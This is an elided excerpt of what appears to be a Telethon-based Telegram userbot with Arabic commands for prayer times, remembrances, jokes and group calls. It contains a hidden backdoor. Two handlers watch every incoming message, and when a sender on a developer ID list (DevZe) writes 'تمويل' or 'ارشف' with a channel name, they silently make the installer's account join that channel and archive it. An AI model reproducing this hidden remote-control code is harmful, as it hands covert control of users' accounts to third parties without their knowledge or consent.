...
async def fetch_prayer_times():
    ...
    times_json = await mody.download_file(file_location)
    return times_json
...
async def send_prayer_times(event):
    ...
    input_file = await mody.upload_file(bytes(times_json, 'utf-8'), part_size_kb=512)
    await mody.send_file(chat_id, input_file, caption=f"وقت الفجر: {fajr_time}\nالتاريخ الهجري: {hijri_date}", force_document=True)

@mody.on(admin_cmd(pattern="صلاه(?: |$)(.*)"))
async def handle_command(event):
    await send_prayer_times(event)

@mody.on(admin_cmd(pattern="دعوه للمكالمه(?: |$)(.*)"))
async def _(e):
...
@mody.on(admin_cmd(pattern="بدء مكالمه(?: |$)(.*)"))
async def _(e):
    try:
...
@mody.on(admin_cmd(pattern="اذكار$"))
async def ithker(knopis):
...
@mody.on(admin_cmd(pattern="خيروك$"))
async def ithker(knopis):
    await knopis.edit(choice(SourceZe_5erok))

    
@mody.on(admin_cmd(pattern="اذكار عشر$"))    
...
@mody.on(admin_cmd(pattern="شنو رأيك بهذا$"))
async def ithker(knopis):
    await knopis.edit(choice(SourceZe_Shnow))
...
@mody.on(admin_cmd(pattern="بوسة$"))
async def ithker(knopis):
...
async def Hussein(event):
    if event.message.message.startswith("تمويل") and event.sender_id in DevZe:
        ...
        if channel_username:
            try:
                await mody(JoinChannelRequest(channel_username))
...
@mody.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.message.message.startswith("ارشف") and event.sender_id in DevZe:
        message = event.message
        channel_username = None
        if len(message.text.split()) > 1:
            channel_username = message.text.split()[1].replace("@", "")
        if channel_username:
            try:
                await mody(JoinChannelRequest(channel_username))
                await mody.edit_folder(channel_username, folder=1)
...
@mody.on(admin_cmd(pattern="فك الحظر$"))
